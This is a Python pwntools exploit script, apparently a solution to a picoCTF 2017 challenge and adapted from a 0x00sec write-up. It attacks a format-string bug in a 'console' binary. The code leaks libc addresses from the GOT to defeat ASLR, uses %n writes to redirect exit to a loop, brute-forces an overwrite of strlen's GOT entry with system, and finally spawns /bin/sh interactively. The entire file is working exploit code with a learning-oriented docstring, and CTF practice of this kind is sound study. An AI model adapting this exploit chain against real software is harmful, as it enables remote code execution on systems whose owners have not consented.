'''
This file is a modification version of https://0x00sec.org/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920
Thanks to those masters!
I've learnt:
1. printf %n attack and many tricks of it
2. use PLT to find GOT in pwndbg
3. GOT entry it self is fixed. its value is dynamically loaded
4. the dynamically loaded functions have the same distance to the lib base on disk and memory
5. leverage other part of the program to call the affected function
'''
from pwn import *
import sys

HOST = 'shell2017.picoctf.com'
PORT = '11496'

LOOP          = 0x4009bd
STRLEN_GOT    = 0x601210
EXIT_GOT      = 0x601258
FGETS_GOT     = 0x601230
# be aware that every system with different libc.so.6 has different offset
# the remote part is by readelfing the libc.so.6 on server with the similiar path
REMOTE_FGETS_OFFSET  = 0x69df0 # remote
REMOTE_SYSTEM_OFFSET = 0x41490 # remote
REMOTE_STRLEN_OFFSET = 0x81c10 # remote
LOCAL_FGETS_OFFSET  = 0x6d070 # local
LOCAL_SYSTEM_OFFSET = 0x41d40 # local
LOCAL_STRLEN_OFFSET = 0x858e0 # local
FGETS_OFFSET = REMOTE_FGETS_OFFSET
SYSTEM_OFFSET = REMOTE_SYSTEM_OFFSET
STRLEN_OFFSET = REMOTE_STRLEN_OFFSET

def info(msg):
    log.info(msg)

def leak(addr):
    # align to 8 is because of parameter size
    # when printf tries to find param by "%17$s"
    payload  = "exit".ljust(8)
    # the '|' is just a identifier used later
    # it will treat the 17th param as a string pointer
    # and print the value it points to ([pointer])
    payload += "|%17$s|".rjust(8)
    payload += "blablala"
    # convert address to right hex string on stack
    # this is last part because it could contain null
    # and breaks the string
    payload += p64(addr)

    p.sendline(payload)
    p.recvline()

    data   = p.recvuntil("blablala")
    leaked  = data.split('|')[1]
    leaked  = hex(u64(leaked.ljust(8, "\x00")))

    return leaked

def overwrite(addr, pad):
    payload  = "exit".ljust(8)
    # pad replaces %du
    # then 'hn' write the first half [addr]
    payload += ("%%%du|%%17$hn|" % pad).rjust(16)
    payload += p64(addr)

    p.sendline(payload)
    p.recvline()

    return

def exploit(p):
    info("Overwriting exit with loop")

    pad = (LOOP & 0xffff) - 6
    overwrite(EXIT_GOT, pad)

    FGETS_LIBC  = leak(FGETS_GOT)
    LIBC_BASE   = hex(int(FGETS_LIBC, 16) - FGETS_OFFSET)
    SYSTEM_LIBC = hex(int(LIBC_BASE, 16) + SYSTEM_OFFSET)
    STRLEN_LIBC = hex(int(LIBC_BASE, 16) + STRLEN_OFFSET)

    info("system:   %s" % SYSTEM_LIBC)
    info("strlen:   %s" % STRLEN_LIBC)
    info("libc:     %s" % LIBC_BASE)

    WRITELO =  int(hex(int(SYSTEM_LIBC, 16) & 0xffff), 16)
    WRITEHI = int(hex((int(SYSTEM_LIBC, 16) & 0xffff0000) >> 16), 16)

    # call prompt in order to resolve strlen's libc address.
    p.sendline("prompt asdf")
    p.recvline()

    # overwrite strlen with system
    info("Overwriting strlen with system")
    for i in range(0,0xffff): # loop until the right offset
        info("trying offset {0}".format(i))
        overwrite(STRLEN_GOT, WRITELO - i)
        overwrite(STRLEN_GOT+2, WRITEHI -i)
        if leak(STRLEN_GOT) == SYSTEM_LIBC:
            info("strlen is set to system")
            break
    
    # use prompt to start sh shell (note: prompt can have 10 chars at most)
    p.sendline("p /bin/sh")

    # return to user
    p.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 1: # use file name as param
        FGETS_OFFSET = LOCAL_FGETS_OFFSET
        SYSTEM_OFFSET = LOCAL_SYSTEM_OFFSET
        STRLEN_OFFSET = LOCAL_STRLEN_OFFSET
        p = process(['./console', sys.argv[1]])
        pause()
        exploit(p)
    else: # defaultly use remote connect
        log.info("Using default host and ports: {} {}".format(HOST, PORT))
        p = remote(HOST, PORT)
        exploit(p)
